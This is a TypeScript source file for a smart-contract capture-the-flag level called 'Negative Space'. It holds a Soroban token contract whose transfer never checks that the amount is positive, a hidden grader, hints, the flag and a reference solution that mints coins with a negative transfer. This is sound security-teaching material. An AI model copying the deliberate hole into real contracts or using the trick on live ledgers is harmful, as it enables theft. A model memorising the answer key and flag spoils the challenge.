import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 04 — NEGATIVE SPACE.
//
// Class: missing bounds validation on an amount (Stellar Security Portal:
// "Missing upper bound validation allows potential overflow scenarios" and
// the family around it). `transfer` checks the sender can afford `amount`
// and never that `amount` is positive. A negative amount runs the transfer
// backwards: the sender gains, the recipient pays.
//
// Harness: every call may be signed, so the legitimate "take it from the
// victim" route exists — the win condition is therefore an invariant it cannot
// satisfy: the victim must be left untouched while the attacker gets richer.

const LEVEL_RS = `//! The Coffer of Saint Stroop — a ledger of who owns what.
//!
//! Every balance here was funded once, at deployment. Read \`transfer\` for what
//! it asks of \`amount\`.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

#[contracttype]
pub enum DataKey {
    Balance(Address),
}

#[contract]
pub struct Coffer;

#[contractimpl]
impl Coffer {
    /// Runs once, at deployment: fund \`holder\` with \`amount\`.
    pub fn __constructor(env: Env, holder: Address, amount: i128) {
        write_balance(&env, &holder, amount);
    }

    /// Move \`amount\` from \`from\` to \`to\`. \`from\` must sign.
    pub fn transfer(env: Env, from: Address, to: Address, amount: i128) {
        from.require_auth();

        let from_balance = read_balance(&env, &from);
        if from_balance < amount {
            panic!("insufficient balance");
        }
        write_balance(&env, &from, from_balance - amount);

        let to_balance = read_balance(&env, &to);
        write_balance(&env, &to, to_balance + amount);
    }

    /// Public view: the coffer's ledger is readable by anyone.
    pub fn balance_of(env: Env, who: Address) -> i128 {
        read_balance(&env, &who)
    }
}

fn read_balance(env: &Env, who: &Address) -> i128 {
    env.storage()
        .instance()
        .get::<DataKey, i128>(&DataKey::Balance(who.clone()))
        .unwrap_or(0)
}

fn write_balance(env: &Env, who: &Address, amount: i128) {
    env.storage()
        .instance()
        .set(&DataKey::Balance(who.clone()), &amount);
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The coffer holds 1,000 for \`victim\` and nothing for \`attacker\`. The grader
// lets every call be signed, then checks the end state: \`victim\` must STILL
// hold 1,000, and \`attacker\` must hold at least 1,000.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::CofferClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: what does transfer() demand of \`amount\`? What if it asks for less than nothing?
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The coffer is funded for the victim at deployment, and every authorization
// is mocked: the attacker may sign for anyone. Taking the victim's coins the
// plain way would leave the victim poorer, which this test refuses. The only
// way to end up with 1,000 while the victim keeps 1,000 is to print money.
use negative_space::exploit;
use negative_space::level::{Coffer, CofferClient};
use soroban_sdk::testutils::Address as _;
use soroban_sdk::{Address, Env};

#[test]
fn ctf_win() {
    let env = Env::default();
    let victim = Address::generate(&env);
    let attacker = Address::generate(&env);

    let coffer_id = env.register(Coffer, (victim.clone(), 1_000_i128));
    let client = CofferClient::new(&env, &coffer_id);

    assert_eq!(client.balance_of(&victim), 1_000, "setup failed");
    assert_eq!(client.balance_of(&attacker), 0, "setup failed");

    env.mock_all_auths();
    exploit::solve(&env, coffer_id.clone(), victim.clone(), attacker.clone());

    assert_eq!(
        client.balance_of(&victim),
        1_000,
        "the victim was robbed — the point is to make coins from nothing"
    );
    assert!(
        client.balance_of(&attacker) >= 1_000,
        "the attacker did not end up with at least 1,000"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::{Address, Env};

use crate::level::CofferClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = victim;
    let client = CofferClient::new(env, &vault);
    // transfer() never checks that amount is positive. A negative amount runs
    // the transfer backwards: the sender gains and the recipient pays. Make the
    // coffer itself the one who pays.
    client.transfer(&attacker, &vault, &-1_000);
}
`;

export const negativeSpace: CtfLevel = {
  slug: "negative-space",
  title: "Negative Space",
  tagline: "A transfer that checks the sender can afford it — and never that the amount is real.",
  difficulty: "adept",
  estMinutes: 15,
  story: `The Coffer of Saint Stroop keeps honest books. Every transfer is checked: has the sender enough? If so, the numbers move.

The clerk who wrote the check never imagined a customer asking to send less than nothing.`,
  brief: `## The target

\`src/level.rs\` is a ledger. \`transfer(from, to, amount)\` makes \`from\` sign, checks \`from\` can afford \`amount\`, then moves it.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

The coffer holds **1,000** for \`victim\` and nothing for \`attacker\`. The grader lets every call be signed, then checks the end state: \`victim\` must **still** hold 1,000, and \`attacker\` must hold **at least 1,000**.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- Taking the victim's coins leaves the victim poorer, so it does not count. Someone else has to pay.

## Reading the ledger

\`balance_of(who)\` is a public view. Any address can hold a balance, including the coffer's own.`,
  hints: [
    "Look at what `transfer` checks about `amount`. It checks the sender can afford it. Does it check that `amount` is positive?",
    "With a negative `amount`, `from_balance - amount` grows and `to_balance + amount` shrinks. The transfer runs backwards.",
    "You sign as `attacker`, so `attacker` can be `from`. Pick any address other than the victim as `to`, even the coffer's own address, and send `-1_000`.",
  ],
  files: {
    "Cargo.toml": cargoToml("negative_space"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  forbid: ["storage"],
  flag: "TUSST{m1nus_m4k3s_pl0s}",
  reference: REFERENCE_RS,
};
